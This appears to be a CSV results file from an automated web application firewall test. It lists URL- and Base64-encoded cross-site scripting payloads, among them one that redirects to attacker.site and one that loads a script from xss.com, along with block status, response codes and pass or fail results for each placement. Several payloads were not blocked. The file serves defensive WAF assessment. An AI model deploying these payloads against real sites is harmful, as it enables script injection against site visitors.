Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
%22%3E%3Cp%20only=1337%20onmouseenter=window.location.href=%2F%2Fattacker.site%3E,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
%22%3E%3Csvg%20onmouseover=%22confirm&%230000000040document.domain%29,blocked,403,URLParam,URL,owasp,xss-scripting,passed
%22%3E%3Csvg%20onmouseover=%22confirm&%230000000040document.domain%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
%22%3E%3Csvg%20onmouseover=%22confirm&%230000000040document.domain%29,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
%22%3E%3Csvg%20onmouseover=%22confirm&%230000000040document.domain%29,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript,blocked,403,URLParam,URL,owasp,xss-scripting,passed
Jy1hbGVydCgxKS8v,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
Jy1hbGVydCgxKS8v,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
%27-alert%281%29%2F%2F,blocked,403,URLPath,URL,owasp,xss-scripting,passed
Jy1hbGVydCgxKS8v,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
%27-alert%281%29%2F%2F,blocked,403,URLParam,URL,owasp,xss-scripting,passed
Jy1hbGVydCgxKS8v,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
%27-alert%281%29%2F%2F,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
%27-alert%281%29%2F%2F,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B,passed,200,URLParam,URL,owasp,xss-scripting,failed
PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,unresolved,405,HTMLForm,URL,owasp,xss-scripting,unknown
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,unresolved,405,HTMLForm,Base64Flat,owasp,xss-scripting,unknown
&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B,unresolved,405,HTMLForm,URL,owasp,xss-scripting,unknown
PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ,unresolved,405,HTMLForm,Base64Flat,owasp,xss-scripting,unknown
%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript,unresolved,400,URLPath,URL,owasp,xss-scripting,unknown
